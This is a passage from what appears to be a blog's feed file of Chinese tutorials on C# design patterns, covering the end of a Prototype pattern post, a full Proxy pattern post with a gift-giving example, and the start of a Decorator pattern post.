punctuation">;</span>            b<span class="token punctuation">.</span><span class="token function">SetWorkExperience</span><span class="token punctuation">(</span><span class="token string">"1998-2006"</span><span class="token punctuation">,</span> <span class="token string">"YY企业"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Resume c <span class="token operator">=</span> <span class="token punctuation">(</span>Resume<span class="token punctuation">)</span>a<span class="token punctuation">.</span><span class="token function">Clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            c<span class="token punctuation">.</span><span class="token function">SetWorkExperience</span><span class="token punctuation">(</span><span class="token string">"1998-2003"</span><span class="token punctuation">,</span> <span class="token string">"ZZ企业"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            a<span class="token punctuation">.</span><span class="token function">Display</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            b<span class="token punctuation">.</span><span class="token function">Display</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            c<span class="token punctuation">.</span><span class="token function">Display</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Console<span class="token punctuation">.</span><span class="token function">Read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//简历</span>    <span class="token keyword">class</span> <span class="token class-name">Resume</span> <span class="token punctuation">:</span> ICloneable    <span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> name<span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> sex<span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> age<span class="token punctuation">;</span>        <span class="token keyword">private</span> WorkExperience work<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token function">Resume</span><span class="token punctuation">(</span><span class="token keyword">string</span> name<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>            work <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WorkExperience</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">/// &lt;summary></span>        <span class="token comment" spellcheck="true">/// 对应用的克隆</span>        <span class="token comment" spellcheck="true">/// &lt;/summary></span>        <span class="token comment" spellcheck="true">/// &lt;param name="work">&lt;/param></span>        <span class="token keyword">private</span> <span class="token function">Resume</span><span class="token punctuation">(</span>WorkExperience work<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>work <span class="token operator">=</span> <span class="token punctuation">(</span>WorkExperience<span class="token punctuation">)</span>work<span class="token punctuation">.</span><span class="token function">Clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//设置个人信息</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">SetPersonalInfo</span><span class="token punctuation">(</span><span class="token keyword">string</span> sex<span class="token punctuation">,</span> <span class="token keyword">string</span> age<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>sex <span class="token operator">=</span> sex<span class="token punctuation">;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//设置工作经历</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">SetWorkExperience</span><span class="token punctuation">(</span><span class="token keyword">string</span> workDate<span class="token punctuation">,</span> <span class="token keyword">string</span> company<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            work<span class="token punctuation">.</span>WorkDate <span class="token operator">=</span> workDate<span class="token punctuation">;</span>            work<span class="token punctuation">.</span>Company <span class="token operator">=</span> company<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//显示</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">Display</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"{0} {1} {2}"</span><span class="token punctuation">,</span> name<span class="token punctuation">,</span> sex<span class="token punctuation">,</span> age<span class="token punctuation">)</span><span class="token punctuation">;</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"工作经历：{0} {1}"</span><span class="token punctuation">,</span> work<span class="token punctuation">.</span>WorkDate<span class="token punctuation">,</span> work<span class="token punctuation">.</span>Company<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> Object <span class="token function">Clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//使用Resume的构造函数完成对引用对象的克隆</span>            Resume obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Resume</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>work<span class="token punctuation">)</span><span class="token punctuation">;</span>            obj<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">;</span>            obj<span class="token punctuation">.</span>sex <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>sex<span class="token punctuation">;</span>            obj<span class="token punctuation">.</span>age <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>age<span class="token punctuation">;</span>            <span class="token keyword">return</span> obj<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//工作经历</span>    <span class="token keyword">class</span> <span class="token class-name">WorkExperience</span> <span class="token punctuation">:</span> ICloneable    <span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> workDate<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">string</span> WorkDate        <span class="token punctuation">{</span>            <span class="token keyword">get</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> workDate<span class="token punctuation">;</span> <span class="token punctuation">}</span>            <span class="token keyword">set</span> <span class="token punctuation">{</span> workDate <span class="token operator">=</span> <span class="token keyword">value</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> company<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">string</span> Company        <span class="token punctuation">{</span>            <span class="token keyword">get</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> company<span class="token punctuation">;</span> <span class="token punctuation">}</span>            <span class="token keyword">set</span> <span class="token punctuation">{</span> company <span class="token operator">=</span> <span class="token keyword">value</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> Object <span class="token function">Clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token punctuation">(</span>Object<span class="token punctuation">)</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">MemberwiseClone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>结果展示：</strong></p><blockquote><p>小王 男 29<br>工作经历：2010-2014 XX公司<br>小王 男 29<br>工作经历：2015-2018 YY企业<br>小王 男 24<br>工作经历：1998-2003 ZZ企业</p></blockquote><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li>《大话设计模式》</li><li>《设计模式精解及面试攻略》</li></ul>]]></content>
      
      
      <categories>
          
          <category> 设计模式 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C# </tag>
            
            <tag> 设计模式 </tag>
            
            <tag> 原型模式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>代理模式</title>
      <link href="/2020/08/22/dai-li-mo-shi/"/>
      <url>/2020/08/22/dai-li-mo-shi/</url>
      
        <content type="html"><![CDATA[<h1 id="定义理解"><a href="#定义理解" class="headerlink" title="定义理解"></a>定义理解</h1><p>​        代理模式为其他对象提供一种代理以控制对这个对象的访问。</p><h1 id="角色与职责"><a href="#角色与职责" class="headerlink" title="角色与职责"></a>角色与职责</h1><ul><li><p><strong>抽象角色(Subject)</strong>：</p><p>代理角色和真实角色必须要继承实现的共同抽象接口</p></li><li><p><strong>代理角色(Proxy)</strong>：</p><p>维护一个相应的真实角色，并可以代替真实角色执行其具有的功能</p></li><li><p><strong>真实角色(Real Subject)</strong>：</p><p>不方便出面而由代理角色代替的实际对象</p></li></ul><h1 id="实现步骤"><a href="#实现步骤" class="headerlink" title="实现步骤"></a>实现步骤</h1><ol><li>分析并创建抽象角色接口</li><li>真实角色实现抽象接口</li><li>代理角色需要指向雇佣其的真实对象，实现抽象接口并隐式调用真实对象的方法</li></ol><h1 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h1><p>使用代理追女孩：</p><p><strong>被追求者</strong>：</p><pre class=" language-csharp"><code class="language-csharp">    <span class="token comment" spellcheck="true">//被追求者</span>    <span class="token keyword">class</span> <span class="token class-name">SchoolGirl</span>    <span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> name<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">string</span> Name        <span class="token punctuation">{</span>            <span class="token keyword">get</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> name<span class="token punctuation">;</span> <span class="token punctuation">}</span>            <span class="token keyword">set</span> <span class="token punctuation">{</span> name <span class="token operator">=</span> <span class="token keyword">value</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><p><strong>送礼物的接口</strong>：</p><pre class=" language-csharp"><code class="language-csharp">    <span class="token comment" spellcheck="true">//送礼物的接口</span>    <span class="token keyword">interface</span> <span class="token class-name">GiveGift</span>    <span class="token punctuation">{</span>        <span class="token keyword">void</span> <span class="token function">GiveDolls</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">void</span> <span class="token function">GiveFlowers</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">void</span> <span class="token function">GiveChocolate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p><strong>雇主</strong>：</p><pre class=" language-csharp"><code class="language-csharp">    <span class="token comment" spellcheck="true">//追求者---（雇主）</span>    <span class="token keyword">class</span> <span class="token class-name">Pursuit</span> <span class="token punctuation">:</span> GiveGift    <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//雇主心意的女孩对象</span>        SchoolGirl mm<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token function">Pursuit</span><span class="token punctuation">(</span>SchoolGirl mm<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//追求者与被追求者之间的联系</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>mm <span class="token operator">=</span> mm<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">GiveDolls</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span>mm<span class="token punctuation">.</span>Name <span class="token operator">+</span> <span class="token string">" 送你洋娃娃"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">GiveFlowers</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span>mm<span class="token punctuation">.</span>Name <span class="token operator">+</span> <span class="token string">" 送你鲜花"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">GiveChocolate</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span>mm<span class="token punctuation">.</span>Name <span class="token operator">+</span> <span class="token string">" 送你巧克力"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><p><strong>代理者</strong>：</p><pre class=" language-csharp"><code class="language-csharp">    <span class="token comment" spellcheck="true">//代理者实现接口</span>    <span class="token keyword">class</span> <span class="token class-name">Proxy</span> <span class="token punctuation">:</span> GiveGift    <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//声明一个雇主变量，用来存储聘用代理者的雇主对象</span>        Pursuit gg<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token function">Proxy</span><span class="token punctuation">(</span>SchoolGirl mm<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//建立追求者与本追求者之间的关系</span>            gg <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Pursuit</span><span class="token punctuation">(</span>mm<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">GiveDolls</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//调用雇主对象自身的方法</span>            gg<span class="token punctuation">.</span><span class="token function">GiveDolls</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">GiveFlowers</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            gg<span class="token punctuation">.</span><span class="token function">GiveFlowers</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">GiveChocolate</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            gg<span class="token punctuation">.</span><span class="token function">GiveChocolate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><p><strong>测试类</strong>：</p><pre class=" language-csharp"><code class="language-csharp">    <span class="token keyword">class</span> <span class="token class-name">Program</span>    <span class="token punctuation">{</span>        <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">Main</span><span class="token punctuation">(</span><span class="token keyword">string</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            SchoolGirl jiaojiao <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SchoolGirl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            jiaojiao<span class="token punctuation">.</span>Name <span class="token operator">=</span> <span class="token string">"李娇娇"</span><span class="token punctuation">;</span>            Proxy daili <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Proxy</span><span class="token punctuation">(</span>jiaojiao<span class="token punctuation">)</span><span class="token punctuation">;</span>            daili<span class="token punctuation">.</span><span class="token function">GiveDolls</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            daili<span class="token punctuation">.</span><span class="token function">GiveFlowers</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            daili<span class="token punctuation">.</span><span class="token function">GiveChocolate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Console<span class="token punctuation">.</span><span class="token function">Read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><p><strong>注</strong>：</p><ul><li>代理使用的方法实际是雇主实现的方法</li><li>代理维护一个与雇主相关的对象</li><li>雇主维护一个与追求者相关的对象</li></ul><h1 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h1><p>1).    <strong>远程代理</strong>：也就是为对象在不同的地址空间提供局部代表。这样可以隐藏一个对象存在于不同地址空间的事实。<br>2).    <strong>虚拟代理</strong>：是根据需要创建开销很大的对象。通过它来存放实例化需要很长时间的真是对象。<br>3).    <strong>安全代理</strong>：用来控制真实对象访问时的权限。<br>4).    <strong>智能指引</strong>：是指当调用真实的对象时，代理处理另外一些事。</p><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li>《大话设计模式》</li><li>《设计模式精解及面试攻略》</li></ul><h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">using</span> System<span class="token punctuation">;</span><span class="token keyword">namespace</span> 代理模式<span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name">Program</span>    <span class="token punctuation">{</span>        <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">Main</span><span class="token punctuation">(</span><span class="token keyword">string</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            SchoolGirl jiaojiao <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SchoolGirl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            jiaojiao<span class="token punctuation">.</span>Name <span class="token operator">=</span> <span class="token string">"李娇娇"</span><span class="token punctuation">;</span>            Proxy daili <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Proxy</span><span class="token punctuation">(</span>jiaojiao<span class="token punctuation">)</span><span class="token punctuation">;</span>            daili<span class="token punctuation">.</span><span class="token function">GiveDolls</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            daili<span class="token punctuation">.</span><span class="token function">GiveFlowers</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            daili<span class="token punctuation">.</span><span class="token function">GiveChocolate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Console<span class="token punctuation">.</span><span class="token function">Read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//送礼物的接口</span>    <span class="token keyword">interface</span> <span class="token class-name">GiveGift</span>    <span class="token punctuation">{</span>        <span class="token keyword">void</span> <span class="token function">GiveDolls</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">void</span> <span class="token function">GiveFlowers</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">void</span> <span class="token function">GiveChocolate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//代理者实现接口</span>    <span class="token keyword">class</span> <span class="token class-name">Proxy</span> <span class="token punctuation">:</span> GiveGift    <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//声明一个雇主变量，用来存储聘用代理者的雇主对象</span>        Pursuit gg<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token function">Proxy</span><span class="token punctuation">(</span>SchoolGirl mm<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//建立追求者与本追求者之间的关系</span>            gg <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Pursuit</span><span class="token punctuation">(</span>mm<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">GiveDolls</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//调用雇主对象自身的方法</span>            gg<span class="token punctuation">.</span><span class="token function">GiveDolls</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">GiveFlowers</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            gg<span class="token punctuation">.</span><span class="token function">GiveFlowers</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">GiveChocolate</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            gg<span class="token punctuation">.</span><span class="token function">GiveChocolate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//追求者---（雇主）</span>    <span class="token keyword">class</span> <span class="token class-name">Pursuit</span> <span class="token punctuation">:</span> GiveGift    <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//雇主心意的女孩对象</span>        SchoolGirl mm<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token function">Pursuit</span><span class="token punctuation">(</span>SchoolGirl mm<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//追求者与被追求者之间的联系</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>mm <span class="token operator">=</span> mm<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">GiveDolls</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span>mm<span class="token punctuation">.</span>Name <span class="token operator">+</span> <span class="token string">" 送你洋娃娃"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">GiveFlowers</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span>mm<span class="token punctuation">.</span>Name <span class="token operator">+</span> <span class="token string">" 送你鲜花"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">GiveChocolate</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span>mm<span class="token punctuation">.</span>Name <span class="token operator">+</span> <span class="token string">" 送你巧克力"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//被追求者</span>    <span class="token keyword">class</span> <span class="token class-name">SchoolGirl</span>    <span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> name<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">string</span> Name        <span class="token punctuation">{</span>            <span class="token keyword">get</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> name<span class="token punctuation">;</span> <span class="token punctuation">}</span>            <span class="token keyword">set</span> <span class="token punctuation">{</span> name <span class="token operator">=</span> <span class="token keyword">value</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 设计模式 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C# </tag>
            
            <tag> 设计模式 </tag>
            
            <tag> 代理模式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>装饰模式</title>
      <link href="/2020/08/22/zhuang-shi-mo-shi/"/>
      <url>/2020/08/22/zhuang-shi-mo-shi/</url>
      
        <content type="html"><![CDATA[<h1 id="定义理解"><a href="#定义理解" class="headerlink" title="定义理解"></a>定义理解</h1><p>​        装饰模式，动态地给一个对象添加一些额外的职责，就添加功能来说，装饰模式比生成子类更为灵活。</p><h1 id="角色与职责"><a href="#角色与职责" class="headerlink" title="角色与职责"></a>角色与职责</h1><ul><li><p><strong>抽象组件(Component)</strong>：</p><p>​        定义一个对象接口，可以给这些对象动态地添加职责。</p></li><li><p><strong>具体组件(ConcreteComponent)</strong>：</p><p>​        定义一个实现组件接口的对象。这是实际需要加以装饰的对象，但其对装饰的过程一无所知。</p></li><li><p><strong>装饰器(Decorator)</strong>：</p><p>​        维护对组件对象的引用，并定义了与组件对象形式一致的接口。</p></li><li><p><strong>具体装饰器(ConcreteDecorator)</strong>：</p><p>​        实际上由其负责为抽象组件添加功能。它是从装饰器继承的类，并通过以新的公共方法的形式来添加一些额外的特定功能。</p></li></ul><h1 id="实现步骤"><a href="#实现步骤" class="headerlink" title="实现步骤"></a>实现步骤</h1><ol><li>创建原始的抽象组件和装饰器之间的继承关系；</li><li>在装饰器类中，将抽象组件作为一个字段添加；</li><li>将抽象组件传递到装饰器的构造函数中，并初始化抽象组件对象；</li><li>在装饰器类中，重定向所有抽象组件的方法到抽象组件对象；</li><li>在具体装饰器类中，重写所有抽象组件中需要扩展或修改的方法。</li></ol><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/GOFDesignPattern/装饰模式/装饰模式结构图.jpg" alt="装饰模式结构图"></center><h1 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h1><p><strong>结构图</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/GOFDesignPattern/装饰模式/装饰模式UML.jpg" alt="装饰模式UML"></center><p><strong>ConcreteComponent角色</strong>：</p><pre class=" language-csharp"><code class="language-csharp">    <span class="token preprocessor property">#<span class="token directive keyword">region</span> Person类(ConcreteComponent)</span>    <span class="token keyword">class</span> <span class="token class-name">Person</span>    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token function">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span> <span class="token punctuation">}</span>        <span class="token keyword">private</span> <span class="token keyword">string</span> name<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token function">Person</span><span class="token punctuation">(</span><span class="token keyword">string</span> name<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">virtual</span> <span class="token keyword">void</span> <span class="token function">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">WriteLine</span><span class="token punctuation">(</span><span class="token string">"装扮的{0}"</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span></code></pre><p><strong>Decorator角色</strong>：</p><pre class=" language-csharp"><code class="language-csharp">    <span class="token preprocessor property">#<span class="token directive keyword">region</span> 服饰类(Decorator)</span>    <span class="token keyword">class</span> <span class="token class-name">Finery</span> <span class="token punctuation">:</span> Person    <span class="token punctuation">{</span>        <span class="token keyword">protected</span> Person component<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//打扮</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">Decorate</span><span class="token punctuation">(</span>Person component<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>component <span class="token operator">=</span> component<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">override</span> <span class="token keyword">void</span> <span class="token function">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//调用的是父类中的方法</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>component <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                component<span class="token punctuation">.</span><span class="token function">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token preprocessor property">#<span class="token directive keyword">endregion</span></span></code></pre><p><strong>ConcreteDecorator角色</strong>：</p><pre class=" language-csharp"><code class="language-csharp">    <span class="token preprocessor property">#<span class="token directive keyword">region</span> 具体服饰类(ConcreteDecorator)</span>    <span class="token keyword">class</span> <span class="token class-name">TShirts</span> <span class="token punctuation">:</span> Finery    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">override</span> <span class="token keyword">void</span> <span class="token function">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            Console<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token string">"大T恤 "</span><span class="token punctuation">)</span><span class="token 